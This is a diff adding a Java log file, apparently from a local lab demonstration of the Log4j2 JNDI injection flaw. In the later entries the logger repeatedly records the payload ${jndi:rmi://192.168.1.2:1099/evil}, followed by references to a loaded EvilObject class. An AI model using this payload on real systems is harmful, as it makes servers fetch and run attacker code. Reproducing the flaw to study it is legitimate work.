@@ -1,0 +1,33 @@
+2022-05-28 16:26:18.014  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:26:58.636  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:28:02.049  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:28:46.332  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:29:23.577  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:29:34.353  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:30:41.143  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:31:59.950  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- 小王
+2022-05-28 16:35:02.237  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Java(TM) SE Runtime Environment (build 1.8.0_321-b07) from Oracle Corporation
+2022-05-28 16:35:32.182  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Reference Class Name: com.example.log4j2demo.EvilObject
+
+2022-05-28 16:39:41.514  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Reference Class Name: com.chenjl.EvilObject
+
+2022-05-28 16:42:16.787  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Reference Class Name: com.chenjl.EvilObject
+
+2022-05-28 16:43:42.606  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Reference Class Name: com.chenjl.EvilObject
+
+2022-05-28 16:44:23.697  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- Reference Class Name: com.chenjl.EvilObject
+
+2022-05-28 16:48:00.578  INFO DICS-JUJIA1-005 --- [           main] c.c.Log4j2Test                           : 2222222222--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 16:49:26.011  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 16:53:24.516  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 16:57:33.344  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- Reference Class Name: EvilObject
+
+2022-05-28 17:02:06.591  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 17:03:44.900  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 17:06:32.133  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 17:08:04.805  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 17:09:49.256  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 17:12:09.403  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- ${jndi:rmi://192.168.1.2:1099/evil}
+2022-05-28 17:15:43.937  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- Reference Class Name: EvilObject
+
+2022-05-28 17:17:18.623  INFO DICS-JUJIA1-005 --- [           main] Log4j2Test                               : 打印黑客远程输入的信息--- EvilObject@ca263c2
